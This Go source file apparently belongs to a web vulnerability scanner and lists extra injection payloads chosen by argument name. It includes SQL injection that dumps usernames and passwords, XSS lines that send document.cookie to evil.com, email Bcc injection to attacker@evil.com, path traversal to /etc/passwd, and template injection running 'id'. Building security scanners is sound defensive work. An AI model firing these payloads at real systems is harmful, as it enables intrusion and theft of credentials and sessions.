package scanner

import "strings"

// contextRule maps argument name patterns to prioritized categories and extra payloads.
type contextRule struct {
	// Substrings to match against the lowercased argument name.
	Patterns []string
	// Categories to prioritize for this arg (run these first, with extra payloads).
	ExtraPayloads map[Category][]string
}

var contextRules = []contextRule{
	{
		Patterns: []string{"email", "mail", "mailto"},
		ExtraPayloads: map[Category][]string{
			CategorySQLi: {
				`test@x.com' OR '1'='1`,
				`admin@test.com'--`,
			},
			CategoryCommandInject: {
				"test@x.com\nBcc: attacker@evil.com",
				"test@x.com%0ABcc:attacker@evil.com",
				"test@x.com\r\nBcc: attacker@evil.com",
			},
			CategoryXSSReflected: {
				`"><script>alert(document.cookie)</script>@x.com`,
				`test+<script>alert(1)</script>@x.com`,
			},
		},
	},
	{
		Patterns: []string{"url", "link", "redirect", "uri", "href", "callback", "return_to", "next", "dest", "target"},
		ExtraPayloads: map[Category][]string{
			CategorySSRF: ssrfPayloads,
		},
	},
	{
		Patterns: []string{"file", "path", "filename", "filepath", "upload", "attachment", "document"},
		ExtraPayloads: map[Category][]string{
			CategoryPathTraversal: {
				`....//....//....//....//....//etc/passwd`,
				`..%252f..%252f..%252f..%252fetc%252fpasswd`,
				`/var/log/apache2/access.log`,
				`/var/log/nginx/access.log`,
				`php://filter/convert.base64-encode/resource=index.php`,
				`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`,
			},
		},
	},
	{
		Patterns: []string{"html", "content", "body", "message", "comment", "text", "description", "bio", "about", "note"},
		ExtraPayloads: map[Category][]string{
			CategoryXSSReflected: {
				`<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`,
				`<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`,
				`<svg/onload=fetch('https://evil.com/'+document.cookie)>`,
				`<div onmouseover="alert(1)">hover me</div>`,
				`<a href="javascript:alert(1)">click me</a>`,
			},
			CategorySSTI: {
				`{{7*'7'}}`,
				`<%= system('id') %>`,
				`${T(java.lang.Runtime).getRuntime().exec('id')}`,
			},
		},
	},
	{
		Patterns: []string{"query", "search", "filter", "where", "keyword", "term", "q", "find"},
		ExtraPayloads: map[Category][]string{
			CategorySQLi: {
				`' UNION SELECT username,password FROM users--`,
				`' UNION SELECT table_name,null FROM information_schema.tables--`,
				`' AND (SELECT COUNT(*) FROM users)>0--`,
				`'; EXEC xp_cmdshell('whoami');--`,
				`' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--`,
			},
			CategoryNoSQLi: {
				`{"$regex":"^admin"}`,
				`{"$where":"this.password.length > 0"}`,
				`{"$gt":"","$lt":"z"}`,
			},
		},
	},
	{
		Patterns: []string{"password", "pass", "passwd", "pwd", "secret"},
		ExtraPayloads: map[Category][]string{
			CategorySQLi: {
				`' OR '1'='1' --`,
				`admin' --`,
				`' UNION SELECT username,password FROM users WHERE '1'='1`,
			},
		},
	},
	{
		Patterns: []string{"name", "username", "user", "login"},
		ExtraPayloads: map[Category][]string{
			CategorySQLi: {
				`admin'--`,
				`' OR username='admin'--`,
				`' UNION SELECT null,null,null--`,
			},
			CategoryXSSReflected: {
				`<script>alert('XSS')</script>`,
				`"><img src=x onerror=alert('XSS')>`,
			},
		},
	},
}

// GetContextualPayloads returns extra payloads for a given argument name,
// mapped by category. These are added on top of the standard payloads.
func GetContextualPayloads(argName string) map[Category][]string {
	lower := strings.ToLower(argName)
	result := make(map[Category][]string)

	for _, rule := range contextRules {
		for _, pattern := range rule.Patterns {
			if strings.Contains(lower, pattern) {
				for cat, payloads := range rule.ExtraPayloads {
					result[cat] = append(result[cat], payloads...)
				}
				break
			}
		}
	}

	return result
}
